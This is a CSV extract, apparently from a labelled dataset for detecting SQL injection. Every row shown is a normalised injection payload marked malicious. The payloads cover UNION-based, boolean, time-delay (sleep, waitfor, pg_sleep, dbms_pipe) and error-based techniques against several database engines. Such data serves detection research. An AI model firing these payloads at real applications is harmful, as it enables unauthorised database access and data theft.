row_index,payload_norm,label,sqli_type_hint
10140,1'+ ( select hkrg where 3665 = 3665,1,
10141,"-5431"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ipmo"" = ""ipmo",1,
10142,1' ) rlike ( select ( case when ( 9308 = 2540 ) then 1 else 0x28 end ) ) and ( 'rghd' = 'rghd,1,
10143,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%' = '",1,
10144,select ( case when ( 9907 = 2736 ) then 9907 else 9907* ( select 9907 from mysql.db ) end ) #,1,
10145,end and ( ( 2160 = 2160,1,
10146,"-2855"" ) ) ) union all select 1496,1496,1496,1496#",1,
10147,"-8544%"" or 6872 = 6872 and ""%"" = """,1,
10148,"1%' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and '%' = '",1,
10149,"-8703' ) where 9723 = 9723 union all select 9723,9723,9723,9723,9723#",1,
10150,"1"" or sleep ( 5 ) #",1,
10151,1' ) ) ) waitfor delay '0:0:5'--,1,
10152,"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""umfr"" like ""umfr",1,
10153,-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--,1,
10154,-3107' ) where 7782 = 7782 or 8571 = 8571--,1,
10155,"1"" ) where 4878 = 4878 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1,
10156,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'lvyw' = 'lvyw,1,
10157,"-6263"" union all select 8005,8005#",1,
10158,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,
10159,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1,
10160,"-8793' where 3853 = 3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",1,
10161,"1"" ) where 9962 = 9962 and 4595 = 4595#",1,
10162,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",1,
10163,1 ) as mtnw where 7293 = 7293 and 2603 = 5764--,1,
10164,"-9082 union all select 9858,9858,9858,9858,9858,9858--",1,
10165,"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""snht"" = ""snht",1,
10166,"-9884' ) or elt ( 1942 = 8409,8409 ) and ( 'tqdq' like 'tqdq",1,
10167,"1%"" union all select null,null,null,null,null,null,null--",1,
10168,"-9587 union all select 1568,1568,1568,1568,1568,1568#",1,
10169,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",1,
